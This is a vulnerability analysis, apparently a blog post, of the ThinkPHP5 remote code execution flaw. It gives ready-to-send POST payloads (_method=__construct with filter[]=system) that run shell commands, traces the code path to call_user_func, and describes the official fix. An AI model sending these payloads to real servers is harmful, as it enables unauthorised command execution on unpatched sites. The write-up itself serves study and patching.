# ThinkPHP5 Remote Code Execution 2

Author: H3rmesk1t

Data: 2021.08.16

# Vulnerability Summary
- This vulnerability exists in ThinkPHP. The underlying layer does not perform good legality verification on the controller name, resulting in the user being able to call any method of any class without turning on the forced routing, which ultimately leads to the occurrence of remote code execution vulnerability.
- Vulnerability impact version:
5.0.0<=ThinkPHP5<=5.0.23, 5.1.0<=ThinkPHP<=5.1.30

# Initial configuration

Get the test environment code

```bash
composer create-project --prefer-dist topthink/think=5.0.20 tpdemo
```
![Insert the picture description here](https://img-blog.csdnimg.cn/45d4638ea54041578af60d9dae0cea78.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Set the require field of the composer.json file to the following

```bash
"require": {
    "php": ">=5.4.0",
    "topthink/framework": "5.0.23"
},
```

Then execute `composer update`

![Insert the picture description here](https://img-blog.csdnimg.cn/24b4f007e8f3428dbf0d89eba49b9218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Vulnerability Exploit

Payload

````bas
# ThinkPHP <= 5.0.13
POST /?s=index/index
s=whoami&_method=__construct&method=&filter[]=system

# ThinkPHP <= 5.0.23, 5.1.0 <= 5.1.16 Requires to enable the framework app_debug
POST /
_method=__construct&filter[]=system&server[REQUEST_METHOD]=ls -al

# ThinkPHP <= 5.0.23 requires xxx method routing, such as captcha
POST /?s=xxx HTTP/1.1
_method=__construct&filter[]=system&method=get&get[]=ls+-al
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
```
![Insert the picture description here](https://img-blog.csdnimg.cn/25f1195fa70f41b59bf2a19b2ad6a76e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Vulnerability Analysis

It is obvious from the official fix code that `$method` comes from the controllable `$_POST` array, and after obtaining it, it is called directly as a method of the `Request` class. At the same time, the parameter passed in this method is the controllable data `$_POST`, which is equivalent to calling some methods of the `Request` class at will

![Insert the picture description here](https://img-blog.csdnimg.cn/e3f961e9d0f94aa59b1e59fd551fb4ca.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/da28a256be2c4ab6ba1070cc5a37b5ee.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

At the same time, it can be observed that there is a function of overriding the class attributes in the `__construct` method of the `Request` class, which is very beneficial for subsequent utilization. All properties of the `Request` class are as follows

```bash
protected $get protected static $instance;
protected $post protected $method;
protected $request protected $domain;
protected $route protected $url;
protected $put; protected $baseUrl;
protected $session protected $baseFile;
protected $file protected $root;
protected $cookie protected $pathinfo;
protected $server protected $path;
protected $header protected $routeInfo
protected $mimeType protected $env;
protected $content; protected $dispatch
protected $filter; protected $module;
protected static $hook protected $controller;
protected $bind protected $action;
protected $input; protected $langset;
protected $cache; protected $param
protected $isCheckCache;
```
![Insert the picture description here](https://img-blog.csdnimg.cn/ff6d0950d8a34b2fbcdd1b7e05e3c628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Continue to follow up with the program and find that if the framework enables `debug` mode ( 'app_debug'=true ) in the configuration file, the program will call the `param` method of the `Request` class. This method needs special attention, because the `param, route, get, post, put, delete, patch, request, session, server, env, cookie, and input` methods in the `Request` class all call the `filterValue` method, and there are available `call_user_func` functions in this method.

![Insert the picture description here](https://img-blog.csdnimg.cn/c3bb1ed0cd044ea9a272d635f7ef29c9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/1cc13262ebd54df79e83c6d7
7e8489d1.png#pic_center)


Following up on the `param` method, it found that it calls the `method` method. The `method` method will call the `server` method, and the `$this->server` method is passed into the `input` method in the `server` method. The value of this `$this->server` can be overridden by the `__construct` method of the previous `Request` class. When the controllable data is passed into the `input` method as `$data` method, the `$data` filter is processed by the `filterValue` method, where the value of `$filter` part comes from `$this->filter`, which can be used to pass the `__construct` of the previous `Request` class. Method to override assignment

![Insert the picture description here](https://img-blog.csdnimg.cn/ef7291717452471da4f24992a13f6cc1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

![Insert the picture description here](https://img-blog.csdnimg.cn/198a4554f0a14a6e98ff8014024d2340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Next is the process of `filterValue` method call `call_user_func` processing data, and code execution happens here

![Insert the picture description here](https://img-blog.csdnimg.cn/d2023f6f9177407fa3775032794aa934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Next, let’s see if the framework debugging mode is not enabled, if this vulnerability can be exploited, an exec method will be executed in the `run` method. When the `$dispatch['type']` in the method is equal to `controller` or `method`, the `param` method of the `Request` class will be called again.

![Insert the picture description here](https://img-blog.csdnimg.cn/a3c8d43258d64ca2ad0e65a4b2154df7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/308730dbbf3e40a9b60f5551cffc4393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Follow up on the `param` method of the `Request` class, and the subsequent calling process will be the same as the previous analysis.
Now we need to solve another problem, which is how to make `$dispatch['type']` equal to `controller` or `method`. Through tracking code, we found that `$dispatch['type']` comes from the `$result` variable in the `parseRule` method, and the `$result` variable is related to the `$route` variable. This `$route` variable depends on the routing address method defined in the program.

![Insert the picture description here](https://img-blog.csdnimg.cn/5e6e831930bc453bae2191c044ffc477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/c9a2ae45a77f483abd4ba54a71b07ff8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

ThinkPHP5 supports 5 routing address definitions

|Definition method |Definition format |
|--|--|
| Method 1: Routing to module/controller |'[Module/Controller/Operation]? Extra parameter 1=value 1&extra parameter 2=value 2...' |
|Method 2: Route to redirect address | 'External address' (default 301 redirect) or ['External address', 'Redirect code']|
|Method 3: Method to route to controller |'@[Module/Controller/] Operation' |
|Method 4: Methods that route to class |'\full namespace class::static method' or '\full namespace class@dynamic method' |
|Method 5: Route to closure function | Closure function definition (support parameter incoming) |

In the complete version of ThinkPHP5, the routing address of the verification code class is defined. When the program is initialized, the file in the `vendor` directory will be loaded through the automatic class loading mechanism. This way, this route is added in the `GET` method. This routing address can be used to make `$dispatch['type']` equal to `method`, thus completing the remote code execution vulnerability.

Constructed Payload

````bas
POST /index.php?s=captcha HTTP/1.1
    ⋮
Content-Length: 59

_method=__construct&filter[]=system&method=get&get[]=ls+-al
# or
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
```
# Vulnerability Fix

The official fix is: perform whitelist verification on the request method `$method`

![Insert the picture description here](https://img-blog.csdnimg.cn/8276fe2e0ac3452cbe8e38e5d51bf33a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Attack summary

Refer to Master Mochazz's audit process

![Insert the picture description here](https://img-blog.csdnimg.cn/3ad586d142d6425e81ca5dcda24165cb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)